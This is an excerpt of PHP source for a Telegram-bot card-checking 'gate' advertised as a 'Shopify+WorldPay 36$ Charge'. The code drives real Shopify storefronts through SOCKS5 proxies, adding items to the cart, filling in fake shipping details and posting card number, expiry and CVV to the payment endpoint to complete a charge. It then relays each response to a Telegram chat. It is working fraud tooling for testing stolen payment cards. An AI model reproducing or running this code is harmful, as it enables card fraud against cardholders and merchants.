...
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        ...
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Shopify+WorldPay (v2) 36$ Charge - /sfr \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
...
do {
include 'Tools/Proxy.php';
curl_setopt($ch, CURLOPT_URL, 'https://thirdeyesociety.co/cart/add.js');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
...
$headers = array(
'content-type: multipart/form-data; boundary=----WebKitFormBoundarySfw1ooegw3GaqaYA',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarySfw1ooegw3GaqaYA
Content-Disposition: form-data; name="form_type"

product
------WebKitFormBoundarySfw1ooegw3GaqaYA
...
------WebKitFormBoundarySfw1ooegw3GaqaYA--');
$curl1 = curl_exec($ch);
file_put_contents('Curl1.txt', $curl1);
$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);

  $url = 'https://api.telegram.org/bot'.$bot_token.'/sendMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'text' => "$curl1 - $response_code",
...
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, 'https://www.homeloft.sg/cart');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
...
curl_setopt($ch, CURLOPT_POSTFIELDS, 'updates%5B%5D=1&checkout=Proceed+to+checkout');
$curl2 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht1.'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=abhays32109%40gmail.com&checkout%5Bshipping_address%5D%5Bfirst_name%5D=ertfvr&checkout%5Bshipping_address%5D%5Blast_name%5D=vbrbv&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=6767+Gardenia+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=Nilje+Gaon&checkout%5Bshipping_address%5D%5Bcountry%5D=US&checkout%5Bshipping_address%5D%5Bprovince%5D=California&checkout%5Bshipping_address%5D%5Bzip%5D=92055&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=Singapore&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Ching&checkout%5Bshipping_address%5D%5Blast_name%5D=Sun&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=5656+Orchard+Road&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=059567&checkout%5Bshipping_address%5D%5Bphone%5D=62381245&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=851&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl4 = curl_exec($ch);
sleep(1);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht2.'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping-9.95&checkout%5Bclient_details%5D%5Bbrowser_width%5D=868&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl44 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"Jack Coddrey","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.homeloft.sg"}');
$curl6 = curl_exec($ch);
...
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht3.'&previous_step=payment_method&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D=75003232423&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=4746&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=851&checkout%5Bclient_details%5D%5Bbrowser_height%5D=746&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=-330');
$curl7 = curl_exec($ch);
